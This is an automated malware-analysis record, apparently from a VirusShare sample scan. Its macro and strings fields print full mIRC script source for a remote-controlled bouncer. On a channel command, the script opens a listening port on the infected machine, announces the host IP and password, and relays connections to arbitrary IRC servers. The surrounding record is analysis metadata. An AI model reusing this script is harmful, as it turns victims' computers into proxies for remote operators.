{
    "docinfo": {
        "attributes": [],
        "behavior": {},
        "macro": "on 500:text:!*:#:{\n  if $me !isvo $chan { halt }\n  if (($lower($1) == !bnc) && ($2 != $null) && ($3 != $null)) {\n    if ($sock(Bnc)) {\n      msg # [BNC] - Status: [Already Active]\n      halt\n    }\n    set %Bnc on\n    socklisten Bnc $2\n    set %Bnc.port $2\n    set %Bnc.passwd $3 \n    msg # [BNC] - Status: [Activated] Password: \u0002[\u0002 %Bnc.passwd \u0002]\u0002 Port: \u0002[\u0002 %Bnc.port \u0002]\u0002 ( $+ $ip $+ )\n  }\n  if ($lower($1) == !bncstats) {\n    if ($sock(Bnc)) {\n      msg # [BNC]\ufffd-\ufffdStatus:\ufffd[Active]\ufffdPassword:\ufffd\u0002[\u0002 %Bnc.passwd\ufffd\u0002]\u0002\ufffdPort:\ufffd\u0002[\u0002 %Bnc.port\ufffd\u0002]\u0002\ufffdUsers:\ufffd\u0002[\u0002 $sock(BncClient*,0) \u0002]\u0002\ufffdOn\ufffdServers:\ufffd\u0002[\u0002 $sock(BncServer*,0) \u0002]\u0002\n    }\n    if ($sock(Bnc) == $null) {\n      msg # [BNC]\ufffd-\ufffdStatus:\ufffd[Deactive]\n    }\n  }\n  if ($lower($1) == !bncoff) {\n    sockclose Bnc\n    msg # [BNC]\ufffd-\ufffdStatus:\ufffd[Deactivated]\n  }\n}\non *:socklisten:Bnc:{\n  sockaccept BncClient $+ $rand(10000,99999)\n  socklisten Bnc %Bnc.port\n}\non *:sockread:BncClient*:{\n  sockread %BncClient\n\n  if ($gettok(%BncClient,1,32) == NICK) {\n    set %Bnc.nick $gettok(%BncClient,2,32)\n  }\n  if ($gettok(%BncClient,1,32) == USER) {\n    set %Bnc.user $gettok(%BncClient,2-,32)\n    sockwrite -n $sockname NOTICE AUTH : $+ Bnc Service\n    sockwrite -n $sockname NOTICE AUTH : $+ Password Needed.. /quote PASS <password>\n  }\n  if ($gettok(%BncClient,1,32) == PASS) { \n    if ($gettok(%BncClient,2,32) == %Bnc.passwd) { \n      sockwrite -n $sockname NOTICE AUTH : $+ Bnc Help:    \n      sockwrite -n $sockname NOTICE AUTH : $+ /quote conn <server> <port> <pass>\n    } \n    if ($gottok(%BncClient,2,32) == %Bnc.passwd) { \n      sockwrite -n $sockname NOTICE AUTH : $+ Failed Password.. Retry\n    }\n  }\n  if ($gettok(%BncClient,1,32) == CONN) {\n    sockclose BncServer $+ $remove($sockname,BncClient)\n    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)\n    sockwrite -n $sockname NOTICE AUTH : $+ Connecting To $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)\n    set %Bnc.server.passwd $gettok(%BncClient,4,32)\n  }\n  else {\n    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {\n      halt\n    }\n    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient\n  }\n}\non *:sockopen:BncServer*:{\n  if ($sockerr) {\n    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connect\n    sockclose $sockname\n    halt\n  }\n  if ($sock($sockname).status != active) {\n    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connect\n    sockclose BncServer $+ $remove($socknme, BncServer)\n    halt\n  }\n  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Successfully Connected.. Enjoy >:)\n  sockwrite -n $sockname NICK %Bnc.nick\n  sockwrite -n $sockname USER %Bnc.user\n  if (%Bnc.server.passwd != $null) {\n    sockwrite -n $sockname PASS %Bnc.server.passwd\n  }\n}\non *:sockread:BncServer*:{\n  sockread %BncServer\n  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {\n    halt\n  }\n  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer\n}"
    },
    "filename": "VirusShare_ceae3b9182c157f4598708f0e6d93537",
    "filesize": 3069,
    "filetype": "data",
    "hashes": {
        "md5": "ceae3b9182c157f4598708f0e6d93537",
        "sha1": "6d39d51772b0731606ced82970f4d5b4c5ae562f",
        "sha256": "5d303398788dba9f542b9a5281d25954127fd853eb1c58c77be6d547b65c7849"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "on 500:text:!*:#:{",
            "  if $me !isvo $chan { halt }",
            "  if (($lower($1) == !bnc) && ($2 != $null) && ($3 != $null)) {",
            "    if ($sock(Bnc)) {",
            "      msg # [BNC] - Status: [Already Active]",
            "      halt",
            "    }",
            "    set %Bnc on",
            "    socklisten Bnc $2",
            "    set %Bnc.port $2",
            "    set %Bnc.passwd $3 ",
            "    msg # [BNC] - Status: [Activated] Password: ",
            " %Bnc.passwd ",
            " Port: ",
            " %Bnc.port ",
            " ( $+ $ip $+ )",
            "  if ($lower($1) == !bncstats) {",
            "    if ($sock(Bnc)) {",
            "      msg # [BNC]-Status:[Active]Password:",
            " %Bnc.passwd",
            "Port:",
            " %Bnc.port",
            "Users:",
            " $sock(BncClient*,0) ",
            "OnServers:",
            " $sock(BncServer*,0) ",
            "    }",
            "    if ($sock(Bnc) == $null) {",
            "      msg # [BNC]-Status:[Deactive]",
            "    }",
            "  if ($lower($1) == !bncoff) {",
            "    sockclose Bnc",
            "    msg # [BNC]-Status:[Deactivated]",
            "on *:socklisten:Bnc:{",
            "  sockaccept BncClient $+ $rand(10000,99999)",
            "  socklisten Bnc %Bnc.port",
            "on *:sockread:BncClient*:{",
            "  sockread %BncClient",
            "  if ($gettok(%BncClient,1,32) == NICK) {",
            "    set %Bnc.nick $gettok(%BncClient,2,32)",
            "  if ($gettok(%BncClient,1,32) == USER) {",
            "    set %Bnc.user $gettok(%BncClient,2-,32)",
            "    sockwrite -n $sockname NOTICE AUTH : $+ Bnc Service",
            "    sockwrite -n $sockname NOTICE AUTH : $+ Password Needed.. /quote PASS <password>",
            "  if ($gettok(%BncClient,1,32) == PASS) { ",
            "    if ($gettok(%BncClient,2,32) == %Bnc.passwd) { ",
            "      sockwrite -n $sockname NOTICE AUTH : $+ Bnc Help:    ",
            "      sockwrite -n $sockname NOTICE AUTH : $+ /quote conn <server> <port> <pass>",
            "    } ",
            "    if ($gottok(%BncClient,2,32) == %Bnc.passwd) { ",
            "      sockwrite -n $sockname NOTICE AUTH : $+ Failed Password.. Retry",
            "    }",
            "  if ($gettok(%BncClient,1,32) == CONN) {",
            "    sockclose BncServer $+ $remove($sockname,BncClient)",
            "    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)",
            "    sockwrite -n $sockname NOTICE AUTH : $+ Connecting To $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)",
            "    set %Bnc.server.passwd $gettok(%BncClient,4,32)",
            "  else {",
            "    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {",
            "      halt",
            "    }",
            "    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient",
            "on *:sockopen:BncServer*:{",
            "  if ($sockerr) {",
            "    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connect",
            "    sockclose $sockname",
            "    halt",
            "  if ($sock($sockname).status != active) {",
            "    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connect",
            "    sockclose BncServer $+ $remove($socknme, BncServer)",
            "    halt",
            "  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Successfully Connected.. Enjoy >:)",
            "  sockwrite -n $sockname NICK %Bnc.nick",
            "  sockwrite -n $sockname USER %Bnc.user",
            "  if (%Bnc.server.passwd != $null) {",
            "    sockwrite -n $sockname PASS %Bnc.server.passwd",
            "on *:sockread:BncServer*:{",
            "  sockread %BncServer",
            "  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {",
            "    halt",
            "  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.420036",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
